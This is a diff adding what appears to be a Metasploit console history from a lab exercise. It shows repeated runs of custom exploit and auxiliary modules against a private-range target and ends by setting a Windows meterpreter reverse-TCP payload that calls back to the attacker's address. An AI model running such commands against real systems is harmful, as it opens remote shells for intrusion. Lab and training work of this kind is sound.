@@ -1,0 +1,56 @@
+reload_all
+use exploits/exploit_mstrauch.rb
+cd ..
+use auxiliary/auxiliary_mstrauch.rb
+show options
+set RHOST 10.3.0.2
+exploit
+exit
+reload_all
+use exploit/exploit_mstrauch.rb
+use auxiliary/auxiliary_mstrauch.rb
+show options
+set rhost 10.3.0.2
+exploit
+run
+exit
+reload_all
+use exploits/exploit_mstrauch.rb
+cd exploits.
+cd exploits
+use auxiliary/auxiliary_mstrauch.rb
+use
+run
+set rhost 10.3.0.2
+run
+exit
+reload_all
+use auxiliary/auxiliary_mstrauch.rb
+set rhost 10.3.0.2
+run
+exit
+reload_all 
+use auxiliary/auxiliary_mstrauch.rb
+set rhost 10.3.0.2
+run
+exit
+use exploit/exploit_mstrauch.rb
+exit
+use auxiliary/auxiliary_mstrauch.rb
+show options
+set rhost 10.3.0.2
+use
+exploit
+run
+use exploit/exploit_mstrauch.rb
+show options
+set rhost 10.3.0.2
+run
+set payload windows/meterpreter/reverse_tcp
+run
+show options
+set lhost 10.3.0.1
+run
+show index
+show options
+exit
